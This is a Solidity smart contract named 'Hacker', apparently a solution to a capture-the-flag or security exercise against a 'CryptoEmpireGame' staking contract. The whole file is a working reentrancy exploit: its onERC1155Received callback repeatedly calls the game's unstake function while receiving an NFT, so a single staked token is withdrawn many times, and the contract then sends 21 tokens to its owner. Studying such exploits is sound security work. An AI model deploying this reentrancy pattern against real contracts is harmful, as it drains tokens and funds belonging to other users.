// contracts/MyContract.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./CryptoEmpireGame.sol";
import "./CryptoEmpireToken.sol";


import "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Holder.sol";
import "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";
import "@openzeppelin/contracts/token/ERC1155/ERC1155.sol";
import "hardhat/console.sol";

contract Hacker is ERC1155Holder {

    CryptoEmpireGame game;
    CryptoEmpireToken token;
    uint16 counter;

    address payable owner;

    constructor(address _game, address _token) {
        game = CryptoEmpireGame(_game);
        token = CryptoEmpireToken(_token);
        owner = payable(msg.sender);
    }


    function onERC1155Received(address operator, address from, uint256 id, uint256 value, bytes memory data) public override
        returns(bytes4)
    {
        counter++;
        console.log("%s Time Receiving NFT", counter);
        if(counter > 1 && counter <= 21){
                game.unstake(2);
        }
        return  this.onERC1155Received.selector;
    }

    function simpleCall() external {
 
        token.safeTransferFrom(msg.sender, address(this), 2, 1, "");
        token.setApprovalForAll(address(game), true);
        
        game.stake(2);
        game.unstake(2);

        token.safeTransferFrom(address(this), owner, 2, 21, "" );

        // game.buy{value: 10}(1);

    }

    fallback() external payable {
        console.log("Fallback");
    }
    receive() external payable {
        console.log("Receive");
    }
}